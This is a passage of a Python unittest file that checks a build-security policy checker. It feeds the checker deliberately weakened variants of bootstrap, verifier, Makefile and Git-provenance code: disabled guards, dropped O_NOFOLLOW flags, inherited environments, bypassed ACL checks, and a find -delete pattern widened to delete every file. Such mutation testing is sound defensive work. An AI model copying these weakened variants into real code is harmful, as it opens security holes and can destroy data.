        source = str(current["python_bootstrap"])
        self.assertEqual(source.count(active_guard), 1)
        source = source.replace(active_guard, "", 1)
        held_body_marker = (
            "                ) as old_launcher:\n"
            "                    for arguments, label, timeout in (\n"
        )
        self.assertIn(held_body_marker, source)
        nested_guard = textwrap.indent(active_guard, "    ")
        current["python_bootstrap"] = source.replace(
            held_body_marker,
            "                ) as old_launcher:\n"
            + nested_guard
            + "                    for arguments, label, timeout in (\n",
            1,
        )
        with synchronized_input_document_summaries(
            current,
            "python_bootstrap",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact reviewed Python framework security closure drifted",
            errors,
        )

    def test_reviewed_framework_lock_pins_execution_closure_and_core(self) -> None:
        mutations = {
            "interpreterRelativePath": "bin/python3",
            "interpreterSize": 1,
            "interpreterSha256": "0" * 64,
            "frameworkBinaryRelativePath": "lib/libpython.dylib",
            "frameworkBinarySize": 1,
            "frameworkBinarySha256": "0" * 64,
            "frameworkCoreFingerprintExcludedPaths": [
                *CHECKER.PYTHON_FRAMEWORK_CORE_EXCLUDED_PATHS,
                "unreviewed",
            ],
            "frameworkCoreFingerprintSha256": "0" * 64,
        }
        for field, replacement in mutations.items():
            with self.subTest(field=field):
                current = inputs()
                toolchain = copy.deepcopy(current["python_toolchain_lock"])
                toolchain["python"][field] = replacement
                current["python_toolchain_lock"] = toolchain
                with synchronized_input_document_summaries(
                    current,
                    "python_toolchain_lock",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "reviewed Python framework security lock drifted",
                    errors,
                )

        distribution_mutations = {
            "installMethod": "macos-installer",
            **{
                field: (
                    value + 1
                    if isinstance(value, int)
                    else "0" * 64
                    if field.lower().endswith("sha256")
                    else "0777"
                    if field.lower().endswith("mode")
                    else "Unreviewed.pkg"
                )
                for field, value in CHECKER.PYTHON_FRAMEWORK_COMPONENT_CONTRACT.items()
            },
        }
        for field, replacement in distribution_mutations.items():
            with self.subTest(distribution_field=field):
                current = inputs()
                toolchain = copy.deepcopy(current["python_toolchain_lock"])
                distribution = toolchain["python"]["distribution"]
                if field == "installMethod":
                    distribution[field] = replacement
                else:
                    distribution["frameworkComponent"][field] = replacement
                current["python_toolchain_lock"] = toolchain
                with synchronized_input_document_summaries(
                    current,
                    "python_toolchain_lock",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "reviewed Python framework security lock drifted",
                    errors,
                )

    def obsolete_reviewed_framework_permission_and_core_mutations_are_rejected(
        self,
    ) -> None:
        cache_file_arguments = (
            '    (\n'
            '        "-type",\n'
            '        "f",\n'
            '        "(",\n'
            '        "-iname",\n'
            '        "*.pyc",\n'
            '        "-o",\n'
            '        "-iname",\n'
            '        "*.pyo",\n'
            '        ")",\n'
            '        "-delete",\n'
            '    ),\n'
        )
        cache_directory_arguments = (
            '    (\n'
            '        "-depth",\n'
            '        "-type",\n'
            '        "d",\n'
            '        "-iname",\n'
            '        "__pycache__",\n'
            '        "-delete",\n'
            '    ),\n'
        )
        mutations = (
            (
                '"/bin/chmod",\n        "-h",\n        "-N",',
                '"/bin/chmod",\n        "-N",',
            ),
            (
                "for prefix in REVIEWED_FRAMEWORK_PARENT_PERMISSION_COMMANDS",
                "for prefix in ()",
            ),
            ("(*prefix, str(root.parents[3]))", "(*prefix, str(root.parents[2]))"),
            ("(*prefix, str(root.parents[2]))", "(*prefix, str(root.parents[1]))"),
            ("(*prefix, str(root.parents[1]))", "(*prefix, str(root.parent))"),
            ("(*prefix, str(root.parent))", "(*prefix, str(root))"),
            (
                "os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW | os.O_CLOEXEC",
                "os.O_RDONLY | os.O_NOFOLLOW | os.O_CLOEXEC",
            ),
            (
                "        verify_targets()\n    except ToolchainBootstrapError:",
                "        pass\n    except ToolchainBootstrapError:",
            ),
            (
                "observed = _run_owned_process(\n            command,",
                "observed = subprocess.run(\n            command,",
            ),
            ("cwd=Path(\"/\")", "cwd=root"),
            ("pass_fds=()", "pass_fds=(3,)"),
            (
                "or expected_executables\n            != (",
                "or False and expected_executables\n            != (",
            ),
            (
                cache_file_arguments + cache_directory_arguments,
                cache_directory_arguments + cache_file_arguments,
            ),
            ('        "*.pyc",', '        "*",'),
            (
                "for arguments in REVIEWED_FRAMEWORK_CACHE_REMOVAL_ARGUMENTS",
                "for arguments in ()",
            ),
            (
                '                "-x",\n                str(root),',
                '                "-x",\n                str(root.parent),',
            ),
            (
                '                "/usr/bin/find",\n                "-x",',
                '                "/usr/bin/true",\n                "-x",',
            ),
            (
                '    "lib/python3.13/site-packages",\n',
                '    "lib/python3.13",\n',
            ),
            ("if observed != expected:", "if observed == expected:"),
            (
                "root not in (resolved, *resolved.parents)",
                "False and root not in (resolved, *resolved.parents)",
            ),
            (
                "if not stat.S_ISREG(info.st_mode):",
                "if False and not stat.S_ISREG(info.st_mode):",
            ),
            (
                "if info.st_nlink != 1 or info.st_size > MAX_TREE_FILE_BYTES:",
                "if False and (info.st_nlink != 1 or info.st_size > MAX_TREE_FILE_BYTES):",
            ),
            (
                '"__pycache__" in folded_parts\n'
                '                    or relative_path.name.casefold().endswith((".pyc", ".pyo"))',
                'False and "__pycache__" in folded_parts\n'
                '                    or False and relative_path.name.casefold().endswith((".pyc", ".pyo"))',
            ),
            (
                "part.casefold() for part in relative_path.parts",
                "part for part in relative_path.parts",
            ),
            (
                "container_before = root.parents[2].lstat()",
                "container_before = root.parents[1].lstat()",
            ),
            (
                "_identity(root.parents[3].lstat()) != _identity(library_before)",
                "False and _identity(root.parents[3].lstat()) != _identity(library_before)",
            ),
            (
                "or PurePosixPath(root.as_posix()) != DEFAULT_REVIEWED_FRAMEWORK_ROOT",
                "or False and PurePosixPath(root.as_posix()) != DEFAULT_REVIEWED_FRAMEWORK_ROOT",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework security closure drifted",
                    errors,
                )

        current = inputs()
        wrap_python_statement_block(
            current,
            'if (\n                    "__pycache__" in folded_parts',
            "if info.st_uid != expected_owner:",
            "if False:",
        )
        with synchronized_input_document_summaries(
            current,
            "python_bootstrap",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact reviewed Python framework security closure drifted",
            errors,
        )

    def test_reviewed_framework_seal_and_core_mutations_are_rejected(
        self,
    ) -> None:
        mutations = (
            (
                "stat.S_IMODE(held.st_mode) & 0o7022",
                "stat.S_IMODE(held.st_mode) & 0o022",
            ),
            (
                "part.casefold() for part in relative_path.parts",
                "part for part in relative_path.parts",
            ),
            (
                'relative_path.name.casefold().endswith((".pyc", ".pyo"))',
                'relative_path.name.endswith((".pyc", ".pyo"))',
            ),
            (
                "if observed != expected:\n",
                "if False and observed != expected:\n",
            ),
            (
                "_identity(root.parents[3].lstat()) != _identity(library_before)",
                "False and _identity(root.parents[3].lstat()) != _identity(library_before)",
            ),
            (
                "or PurePosixPath(install_root.as_posix())\n"
                "                != DEFAULT_REVIEWED_FRAMEWORK_ROOT",
                "or False and PurePosixPath(install_root.as_posix())\n"
                "                != DEFAULT_REVIEWED_FRAMEWORK_ROOT",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework security closure drifted",
                    errors,
                )

    def test_reviewed_framework_acl_verifier_cannot_be_weakened_or_bypassed(
        self,
    ) -> None:
        mutations = (
            ('"/bin/ls",\n            "-led",', '"/bin/ls",\n            "-ld",'),
            ('("/bin/ls", "-leR", str(root))', '("/bin/ls", "-led", str(root))'),
            (
                'acl_entry = re.compile(rb"(?m)^[ \\t]+[0-9]+: ")',
                'acl_entry = re.compile(rb"$^")',
            ),
            (
                'env={"LC_ALL": "C", "PATH": "/usr/bin:/bin"}',
                'env=dict(os.environ)',
            ),
            (
                "or acl_entry.search(process.stdout) is not None",
                "or False and acl_entry.search(process.stdout) is not None",
            ),
            (
                "or expected != _exec_target_identity(Path(command[0]))",
                "or False and expected != _exec_target_identity(Path(command[0]))",
            ),
            (
                "        _verify_reviewed_framework_acl_seal(root)\n",
                "        pass\n",
            ),
            (
                "        _verify_reviewed_framework_acl_seal(root)\n",
                "        if False:\n            _verify_reviewed_framework_acl_seal(root)\n",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old, new=new):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework security closure drifted",
                    errors,
                )

        default_install_guard = (
            "or PurePosixPath(install_root.as_posix())\n"
            "                != DEFAULT_REVIEWED_FRAMEWORK_ROOT"
        )
        for replace_last in (False, True):
            with self.subTest(default_root_guard=replace_last):
                current = inputs()
                replacement = "or False and " + default_install_guard[3:]
                if replace_last:
                    changed_last(
                        current,
                        "python_bootstrap",
                        default_install_guard,
                        replacement,
                    )
                else:
                    changed(
                        current,
                        "python_bootstrap",
                        default_install_guard,
                        replacement,
                    )
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework security closure drifted",
                    errors,
                )

    def test_framework_fingerprint_exclusions_are_ordered_and_nonoverlapping(
        self,
    ) -> None:
        mutations = (
            ("for raw_path in excluded_paths:", "for raw_path in ():"),
            (
                "exclusion_names != sorted(exclusion_names)",
                "exclusion_names == sorted(exclusion_names)",
            ),
            (
                "candidate[: len(parent)] == parent",
                "candidate[: len(parent)] != parent",
            ),
            (
                "relative.parts[: len(excluded)] == excluded",
                "False and relative.parts[: len(excluded)] == excluded",
            ),
            (
                "folded_parts = tuple(part.casefold() for part in relative.parts)",
                "folded_parts = relative.parts",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "build_script", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "build_script",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework fingerprint exclusion closure drifted",
                    errors,
                )

    def test_reviewed_framework_node_verifier_semantics_are_mutation_closed(
        self,
    ) -> None:
        cache_guard = (
            "        const forbiddenCachePath = isForbiddenBytecodeCachePath(childParts);\n"
            "        if (forbiddenCachePath && rejectBytecodeCaches) {\n"
            '          fail("Framework tree contains executable bytecode cache");\n'
            "        }\n"
        )
        source_mutations = (
            (
                "77b58098a5ebc6890e1335eed3afaa1b9bad96029b7b5ad42e45b270b6649d10",
                "ba58cfb559f29c34beb962cb5d88587e9104f5610c255a58494c2945c1e863ec",
            ),
            (
                "const EXPECTED_INSTALLER_APPLEDOUBLE_REMOVALS = 6;",
                "const EXPECTED_INSTALLER_APPLEDOUBLE_REMOVALS = 6;\n"
                "const EXPECTED_INSTALLER_SYMLINK_MODE_CHANGES = 33;",
            ),
            (
                "python.installRoot !== EXACT_ROOT",
                "false && python.installRoot !== EXACT_ROOT",
            ),
            (
                'environment.NODE_OPTIONS !== ""',
                'false && environment.NODE_OPTIONS !== ""',
            ),
            (
                "if (!Number.isInteger(value) || value === 0) {",
                "if (false) {",
            ),
            (
                'requiredOpenFlag("O_NOFOLLOW")',
                'fs.constants.O_RDONLY',
            ),
            (
                "if (root !== EXACT_ROOT) {",
                "if (false && root !== EXACT_ROOT) {",
            ),
            (
                "function verifyLockValue(lock) {",
                "function ignoreHeldLockValue(lock) {",
            ),
            (
                "return verifyLockValue(readLockFile(lockPath));",
                "return readLockFile(lockPath);",
            ),
            (
                "if (hasLockPath === hasLockValue) {",
                "if (false) {",
            ),
            (
                "verifyLockValue(options.lockValue);",
                "void options.lockValue;",
            ),
            (
                "scriptsSize: 380,",
                "scriptsSize: 381,",
            ),
        )
        for old, new in source_mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "framework_verifier", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "framework_verifier",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework Node verifier closure drifted",
                    errors,
                )

        current = inputs()
        verifier = str(current["framework_verifier"])
        self.assertIn(cache_guard, verifier)
        verifier = verifier.replace(cache_guard, "", 1)
        exclusion_end = "        const item = { path: relative, mode: modeText(info) };\n"
        self.assertIn(exclusion_end, verifier)
        current["framework_verifier"] = verifier.replace(
            exclusion_end,
            cache_guard + exclusion_end,
            1,
        )
        with synchronized_input_document_summaries(
            current,
            "framework_verifier",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact reviewed Python framework Node verifier closure drifted",
            errors,
        )

        current = inputs()
        changed(
            current,
            "framework_verifier_tests",
            'test("startup environment rejects Node preload controls", () => {',
            'test("startup environment accepts Node preload controls", () => {',
        )
        with synchronized_input_document_summaries(
            current,
            "framework_verifier_tests",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact reviewed Python framework Node verifier closure drifted",
            errors,
        )

    def test_reviewed_framework_inventory_inputs_are_semantic(self) -> None:
        current = inputs()
        changed(
            current,
            "framework_inventory_generator",
            "const SEALED_CORE_CONTRACT = Object.freeze({",
            "const UNREVIEWED_CORE_CONTRACT = Object.freeze({",
        )
        with synchronized_reviewed_input_summaries(
            current,
            "framework_inventory_generator",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "reviewed Python framework inventory generator drifted",
            errors,
        )

        current = inputs()
        changed(
            current,
            "framework_inventory_generator",
            "const INSTALLER_APPLEDOUBLE_TRANSFORMATIONS = Object.freeze([",
            "const INSTALLER_SYMLINK_MODE_TRANSFORMATIONS = Object.freeze([]);\n"
            "const INSTALLER_APPLEDOUBLE_TRANSFORMATIONS = Object.freeze([",
        )
        with synchronized_reviewed_input_summaries(
            current,
            "framework_inventory_generator",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "reviewed Python framework inventory generator drifted",
            errors,
        )

        current = inputs()
        changed(
            current,
            "framework_inventory",
            '"inventorySha256":"77b58098a5ebc6890e1335eed3afaa1b9bad96029b7b5ad42e45b270b6649d10"',
            '"inventorySha256":"ba58cfb559f29c34beb962cb5d88587e9104f5610c255a58494c2945c1e863ec"',
        )
        with synchronized_reviewed_input_summaries(
            current,
            "framework_inventory",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "reviewed Python framework sealed inventory drifted",
            errors,
        )

        current = inputs()
        changed(
            current,
            "framework_inventory",
            '"kind":"remove-appledouble"',
            '"kind":"symlink-mode"',
        )
        with synchronized_reviewed_input_summaries(
            current,
            "framework_inventory",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "reviewed Python framework sealed inventory drifted",
            errors,
        )

    def test_reviewed_framework_verifier_node_make_gate_cannot_be_removed(
        self,
    ) -> None:
        current = inputs()
        changed(
            current,
            "makefile",
            "\t$(NODE) --test tools/tests/verify_reviewed_python_framework.test.cjs\n",
            "",
        )
        with synchronized_input_document_summaries(current, "makefile"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "packaged-smoke policy Make target dependency, command, or order drifted",
            errors,
        )

    def obsolete_reviewed_framework_verifiers_cannot_be_noop_dead_or_reordered(
        self,
    ) -> None:
        seal_call = (
            "    _verify_reviewed_framework_seal(\n"
            "        locked_framework_root,\n"
            "        python_lock=python_lock,\n"
            "    )\n"
        )
        core_call = (
            "    _verify_reviewed_framework_core(\n"
            "        locked_framework_root,\n"
            "        python_lock=python_lock,\n"
            "        build=build,\n"
            "    )\n"
        )
        mutations = (
            (seal_call, "    pass\n"),
            (core_call, "    pass\n"),
            (seal_call + core_call, core_call + seal_call),
        )
        for old, new in mutations:
            with self.subTest(new=new):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "reviewed Python framework security closure" in error
                        or "installer launcher transition" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_reviewed_framework_verifiers_cannot_be_noop_dead_or_reordered(
        self,
    ) -> None:
        seal_call = (
            "                _verify_reviewed_framework_seal(\n"
            "                    install_root,\n"
            "                    python_lock=python_lock,\n"
            "                )\n"
        )
        core_call = (
            "                _verify_reviewed_framework_core(\n"
            "                    install_root,\n"
            "                    python_lock=python_lock,\n"
            "                    build=build,\n"
            "                )\n"
        )
        mutations = (
            (seal_call, "                pass\n"),
            (core_call, "                pass\n"),
            (seal_call + core_call, core_call + seal_call),
            (
                seal_call + core_call,
                "                if False:\n"
                + textwrap.indent(seal_call + core_call, "    "),
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework security closure drifted",
                    errors,
                )

    def test_python_strict_seal_ast_rejects_unreachable_guards(self) -> None:
        mutations = (
            (
                "if (\n                    before.st_nlink != 1\n"
                "                    or before.st_size > MAX_TREE_FILE_BYTES",
                "file_descriptor: int | None = None",
                "if 1 == 0:",
            ),
            (
                "if before.st_nlink != 1:\n"
                '                    raise ToolchainBootstrapError("Installed toolchain hardlink is forbidden")',
                "child = os.open(",
                "if 1 == 0:",
            ),
            (
                "if before.st_nlink != 1:\n"
                '                    raise ToolchainBootstrapError("Installed toolchain symlink is unsafe")',
                "target = os.readlink(",
                "for _unused in ():",
            ),
        )
        for start, end, wrapper in mutations:
            with self.subTest(start=start, wrapper=wrapper):
                current = inputs()
                wrap_python_statement_block(current, start, end, wrapper)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain producer privatization AST closure drifted",
                    errors,
                )

    def test_python_privatization_ast_rejects_shadow_and_empty_inventory(self) -> None:
        current = inputs()
        changed(
            current,
            "python_bootstrap",
            "                bootstrap_root, bootstrap_fd, _bootstrap_snapshot = _create_private_child(",
            "                _privatize_installed_tree = lambda *_args: None\n"
            "                bootstrap_root, bootstrap_fd, _bootstrap_snapshot = _create_private_child(",
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python toolchain producer privatization AST closure drifted",
            errors,
        )

        names_assignment = (
            "names = tuple(sorted(os.listdir(directory_descriptor)))"
        )
        for replace_last in (False, True):
            with self.subTest(inventory=replace_last):
                current = inputs()
                mutation = (
                    "names = () if True else "
                    "tuple(sorted(os.listdir(directory_descriptor)))"
                )
                if replace_last:
                    changed_last(
                        current,
                        "python_bootstrap",
                        names_assignment,
                        mutation,
                    )
                else:
                    changed(
                        current,
                        "python_bootstrap",
                        names_assignment,
                        mutation,
                    )
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain producer privatization AST closure drifted",
                    errors,
                )

        current = inputs()
        changed(
            current,
            "python_bootstrap",
            "names = tuple(sorted(os.listdir(descriptor)))",
            "names = () if True else tuple(sorted(os.listdir(descriptor)))",
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python toolchain producer privatization AST closure drifted",
            errors,
        )

        current = inputs()
        changed(
            current,
            "python_bootstrap",
            "        nonlocal total_size\n",
            "        nonlocal total_size\n"
            "        os.listdir = lambda _descriptor: ()\n",
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python toolchain producer privatization AST closure drifted",
            errors,
        )

    def test_python_toolchain_node_consumers_and_integrations_are_semantic(self) -> None:
        mutations = (
            (
                "formal_before_pack",
                '"pythonToolchain",\n      "inputDigests"',
                '"inputDigests"',
            ),
            (
                "formal_before_pack",
                "validatePythonToolchainArtifact(root, manifest, repositoryRoot);",
                "void manifest;",
            ),
            (
                "formal_before_pack",
                'path.join(repositoryRoot, "backend", "uv.lock")',
                'path.join(repositoryRoot, "backend", "unreviewed.lock")',
            ),
            (
                "formal_before_pack",
                "ee3c4103b97e32a98e98cfad7f6ca4d09b2ab2dc16f3d28e18b54a4a0244efe0",
                "0" * 64,
            ),
            (
                "formal_before_pack",
                '"share/doc/python3.13/html"',
                '"share/doc/python3.13"',
            ),
            (
                "formal_before_pack",
                '"macos-installer-no-op-framework-component"',
                '"macos-installer-pkg-direct"',
            ),
            (
                "formal_before_pack",
                "payloadSize: 32739568",
                "payloadSize: 1",
            ),
            (
                "formal_before_pack",
                'noOpPostinstallMode: "0755"',
                'noOpPostinstallMode: "0700"',
            ),
            (
                "common_audit",
                '"pythonBuildToolchainPath",',
                "",
            ),
            (
                "prepare",
                "const pythonToolchain = pythonBuild.pythonToolchain;",
                "const pythonToolchain = {};",
            ),
            (
                "bundle_audit",
                "const pythonManifest = python.manifest;",
                'const pythonManifest = loadJson(path.join(sidecarRoot, "build-manifest.json"), "Python manifest");',
            ),
            (
                "before_pack_tests",
                "binds Python toolchain summary, source locks, and canonical artifact inventory",
                "accepts unbound Python toolchain evidence",
            ),
            (
                "before_pack_tests",
                "rejects reviewed Python toolchain mutation: $name",
                "accepts reviewed Python toolchain mutation: $name",
            ),
            (
                "engineering_packaging_tests",
                "pythonBuildToolchainPath:",
                "unreviewedToolchainPath:",
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("Python toolchain" in error for error in errors),
                    errors,
                )

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["properties"]["components"]["properties"]["pythonSidecar"][
            "required"
        ].remove("pythonToolchain")
        current["schema"] = schema
        with synchronized_input_document_summaries(current, "schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("manifest schema" in error for error in errors), errors)

    def test_exact_tag_ref_fixture_is_bound_and_executed_by_policy_target(self) -> None:
        current = inputs()
        changed(
            current,
            "exact_git_checker",
            'f"refs/tags/{arguments.expected_tag}^{{commit}}"',
            'f"{arguments.expected_tag}^{{commit}}"',
        )
        with synchronized_input_document_summaries(current, "exact_git_checker"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("exact Git provenance checker missing" in error for error in errors),
            errors,
        )

        current = inputs()
        changed(
            current,
            "exact_git_checker_tests",
            'self._git(root, "branch", "v1.2.3", "HEAD")',
            'self._git(root, "branch", "not-the-tag", "HEAD")',
        )
        with synchronized_input_document_summaries(
            current,
            "exact_git_checker_tests",
        ):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("exact Git provenance tag tests missing" in error for error in errors),
            errors,
        )

        current = inputs()
        changed(
            current,
            "makefile",
                "\t$(PYTHON) -S -B -m unittest tools.tests.test_check_exact_git_provenance\n",
            "\t@true\n",
        )
        self.assertIn(
            "packaged-smoke policy Make target dependency, command, or order drifted",
            CHECKER.validate_policy(current),
        )

    def test_exact_source_builders_attestations_and_race_fixture_are_semantic(self) -> None:
        mutations = (
            (
                "desktop_entrypoint_builder",
                'entryPoints: ["lcf-reviewed:desktop/src/main/index.ts"]',
                'entryPoints: ["desktop/src/main/index.ts"]',
                "Desktop exact entrypoint builder exact-source contract",
            ),
            (
                "desktop_entrypoint_builder",
                'writeCanonicalJson(path.join(buildRoot, "entrypoint-build.json"), attestation);',
                "void attestation;",
                "Desktop exact entrypoint builder exact-source contract",
            ),
            (
                "renderer_builder",
                "input: `${VIRTUAL_PREFIX}web/src/main.tsx`",
                'input: path.join(webRoot, "src", "main.tsx")',
                "renderer exact builder exact-source contract",
            ),
            (
                "renderer_builder",
                "writeCanonicalJson(path.join(distRoot, ATTESTATION_NAME), attestation);",
                "void attestation;",
                "renderer exact builder exact-source contract",
            ),
            (
                "stage_renderer",
                "inputSnapshotSha256: sourceBuild.inputsSha256",
                'inputSnapshotSha256: "0".repeat(64)',
                "renderer stage",
            ),
            (
                "stage_renderer",
                "packageLockSha256: sourceBuild.packageLockSha256",
                "packageLockSha256: sha256File(PACKAGE_LOCK)",
                "renderer stage",
            ),
            (
                "stage_renderer",
                "validateSource(source, release, environment);",
                "void release;",
                "held-descriptor revalidation",
            ),
            (
                "stage_renderer",
                "rename(previous, destination);",
                "fs.rmSync(previous, { recursive: true });",
                "renderer stage rollback contract",
            ),
            (
                "engineering_packaging_tests",
                "selects reviewed Git object bytes before the exact entrypoint build",
                "uses live Desktop source files",
                "engineering packaging tests",
            ),
            (
                "before_pack_tests",
                "rejects hostile local Git config before provenance commands can use it",
                "uses ambient local Git configuration",
                "beforePack tests",
            ),
            (
                "renderer_packaging_tests",
                "refuses source drift after attestation without replacing staged output",
                "accepts source drift after attestation",
                "renderer packaging tests",
            ),
            (
                "renderer_packaging_tests",
                "restores the old staging directory when atomic publish fails",
                "drops the old staging directory when atomic publish fails",
                "renderer packaging tests",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

    def test_renderer_test_must_use_real_vite_and_plugin_injection(self) -> None:
        mutations = (
            (
                "const viteImplementation = await import(",
                "const viteImplementation = Promise.resolve(",
            ),
            (
                'path.join(repositoryRoot, "web", "node_modules", "vite", "dist", "node", "index.js")',
                'path.join(repositoryRoot, "desktop", "tests", "fake-vite.js")',
            ),
            (
                "const reactPluginModule = await import(",
                "const reactPluginModule = Promise.resolve(",
            ),
            (
                "      viteImplementation,",
                "      viteImplementation: { version: \"7.3.6\", build: vi.fn() },",
            ),
            (
                "      reactPluginFactory: reactPluginModule.default,",
                "      reactPluginFactory: () => ({ name: \"fake-react\" }),",
            ),
            (
                'expect(outputText).not.toContain("transient-renderer-marker")',
                'expect(outputText).toBeDefined()',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "renderer_packaging_tests", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "renderer_packaging_tests",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("real Vite/ABA injection" in error for error in errors),
                    errors,
                )

    def test_renderer_producer_audit_manifest_and_bundle_chain_is_semantic(self) -> None:
        mutations = (
            (
                "audit_renderer",
                "repositoryTree: manifest.source.repositoryTree",
                'repositoryTree: "0".repeat(40)',
            ),
            (
                "prepare",
                "inputSnapshotSha256: renderer.inputSnapshotSha256",
                'inputSnapshotSha256: "0".repeat(64)',
            ),
            (
                "prepare",
                "readReviewedGitBlob(repositoryRoot, rendererPackageLock.objectId)",
                "fs.readFileSync(RENDERER_PACKAGE_LOCK_PATH)",
            ),
            (
                "common_audit",
                "renderer.repositoryTree !== source.tree",
                "false",
            ),
            (
                "before_pack",
                "manifest.components.renderer.inputSnapshotSha256 !==",
                "false &&",
            ),
            (
                "bundle_audit",
                "manifest.components.renderer.sourceSnapshotSha256 !==",
                "false &&",
            ),
            (
                "audit_renderer",
                "manifest.source.packageLockSha256 !== expectedPackageLockSha256",
                "false",
            ),
            (
                "before_pack",
                "expectedPackageLockSha256: source.rendererPackageLockSha256",
                'expectedPackageLockSha256: "0".repeat(64)',
            ),
            (
                "bundle_audit",
                "expectedPackageLockSha256: source.rendererPackageLockSha256",
                'expectedPackageLockSha256: "0".repeat(64)',
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("producer/consumer attestation chain" in error for error in errors),
                    errors,
                )

        for field in (
            "repositoryTree",
            "sourceSnapshotSha256",
            "packageLockSha256",
            "inputSnapshotSha256",
            "inputFiles",
        ):
            with self.subTest(schema_field=field):
                current = inputs()
                schema = copy.deepcopy(current["renderer_schema"])
                schema["properties"]["source"]["required"].remove(field)
                current["renderer_schema"] = schema
                with synchronized_input_document_summaries(current, "renderer_schema"):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any("renderer manifest schema" in error for error in errors))

    def test_hostile_local_git_metadata_and_raw_index_checks_are_semantic(self) -> None:
        mutations = (
            (
                "prepare",
                "  assertSafeLocalGitMetadata(repositoryRoot);\n",
                "",
            ),
            (
                "prepare",
                '        "--no-includes",',
                '        "--includes",',
            ),
            (
                "prepare",
                'const EXACT_LOCAL_GIT_CONFIG_VALUES = Object.freeze({',
                'const UNREVIEWED_LOCAL_GIT_CONFIG_VALUES = Object.freeze({',
            ),
            (
                "prepare",
                '"gc.auto": Object.freeze(["0"])',
                '"gc.auto": Object.freeze(["0", "1"])',
            ),
            (
                "prepare",
                "return reviewedValues.includes(value.toLowerCase());",
                "return true;",
            ),
            (
                "prepare",
                '        "--list"\n',
                '        "--name-only",\n        "--list"\n',
            ),
            (
                "prepare",
                "      raw[0] !== 0x48 ||",
                "      false ||",
            ),
            (
                "prepare",
                "          fs.constants.O_RDONLY | fs.constants.O_NOFOLLOW",
                "          fs.constants.O_RDONLY",
            ),
            (
                "prepare",
                "  validateRawRepositoryState(repositoryRoot, inventory);\n",
                "",
            ),
            (
                "before_pack_tests",
                "await expect(readFile(filterMarker)).rejects.toThrow();",
                "await readFile(filterMarker)",
            ),
            (
                "before_pack_tests",
